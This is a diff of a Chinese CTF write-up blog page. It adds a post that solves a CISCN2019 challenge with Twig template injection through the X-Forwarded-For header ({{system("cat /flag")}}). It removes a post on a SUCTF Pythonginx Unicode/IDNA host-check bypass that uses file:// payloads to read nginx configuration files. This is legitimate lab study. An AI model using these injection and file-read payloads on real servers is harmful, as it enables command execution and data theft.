@@ -136,6 +136,48 @@
 
 
   
+    <article id="post-page-80" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-80/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T06:20:09.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>和[BJDCTF2020]The mystery of ip   这个很类似<br>抓包 通过X-Forwarded-For 来找点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For= &#123;&#123;7*&#x27;7&#x27;&#125;&#125;  回显49==&gt; Twig </span><br><span class="line">直接就X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;就可以</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/66.PNG?raw=true" alt="66.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-80/" data-id="ckror75540000p8w7ep885i7h" data-title="CISCN2019 华东南赛区Web11" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-79" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/21/page-79/" class="article-date">
@@ -608,62 +650,6 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
 
 
   
-    <article id="post-page-69" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/13/page-69/" class="article-date">
-  <time class="dt-published" datetime="2021-07-13T08:58:41.000Z" itemprop="datePublished">2021-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/13/page-69/">SUCTF 2019 Pythonginx</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>这关主要是url中的unicode漏洞引发的域名安全问题</strong><br>1、域名欺骗 ：<br>访问此网站http://Вaidu.com(其中的В是unicode U+0412)<br>会跳转到<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a><br>也可以换成其他的unicode<br>访问http://Вaidu.com 时浏览器会将访问的url交给域名系统（DNS）解析url为ip地址<br>解析url过程用到递归查询和迭代查询 先递归搜索浏览器自己的dns缓存然后搜索操作系统的dns缓存 再搜索hosts文件缓存<br>搜索本地域名服务器 但后迭代搜索根域名服务器知道找到ip地址 找不到就是404<br>在DNS中idna使用punycode转写将ascii字符串存储，本地DNS中因为遇见特殊字符В 因此无法将其转成正常ascii<br>就直接在本地转化为<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/22.PNG?raw=true" alt="22.PNG"></p>
-<p><strong>还有要知道ngix重要文件的位置</strong><br><strong>nginx重要文件的位置：</strong></p>
-<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
-<p>源码这边<br> @app.route(‘/getUrl’, methods=[‘GET’, ‘POST’])<br>def getUrl():<br>    url = request.args.get(“url”)<br>    host = parse.urlparse(url).hostname<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 111”<br>    parts = list(urlsplit(url))<br>    host = parts[1]<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 222 “ + host<br>    newhost = []<br>    for h in host.split(‘.’):<br>        newhost.append(h.encode(‘idna’).decode(‘utf-8’))<br>    parts[1] = ‘.’.join(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = urlunsplit(parts).split(‘ ‘)[0]<br>    host = parse.urlparse(finalUrl).hostname<br>    if host == ‘suctf.cc’:<br>        return urllib.request.urlopen(finalUrl).read()<br>    else:<br>        return “我扌 your problem? 333”<br>    </code><br>    <!-- Dont worry about the suctf.cc. Go on! --><br>    <!-- Do you know the nginx? --></p>
-</body>
-是要对host的判断然后绕过这两个判断
-如果一开始就是suctf.cc压根就没办法 
-
-<p><strong>需要访问suctf.cc/user/local/nginx/conf/nginx.conf</strong>  访问这个配置文件应该能找到flag 位置<br>跑脚本 </p>
-<p>#coding:utf-8</p>
-<p>for i in range(128,65537):<br>    tmp=chr(i)<br>    try:<br>        res = tmp.encode(‘idna’).decode(‘utf-8’)<br>        if(“-“) in res:<br>            continue<br>        print(“U:{}    A:{}      ascii:{} “.format(tmp, res, i))<br>    except:<br>        pass</p>
-<p><strong>找到℆这么一个字符恰好会因为这个漏洞被解析成c/u 这样就能绕过</strong></p>
-<p>构造file://suctf.c℆sr/local/nginx/conf/nginx.conf  也可以用ℂ 来替代c</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/23.PNG?raw=true" alt="23.PNG"></p>
-<p>最终payload：</p>
-<p>file://suctf.c℆sr/fffffflag</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/24.PNG?raw=true" alt="24.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/13/page-69/" data-id="ckroqtfm5001dyww76gmd19im" data-title="SUCTF 2019 Pythonginx" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -704,6 +690,10 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
           </li>
         
           <li>
+            <a href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -713,10 +703,6 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
         
           <li>
             <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
           </li>
         
       </ul>
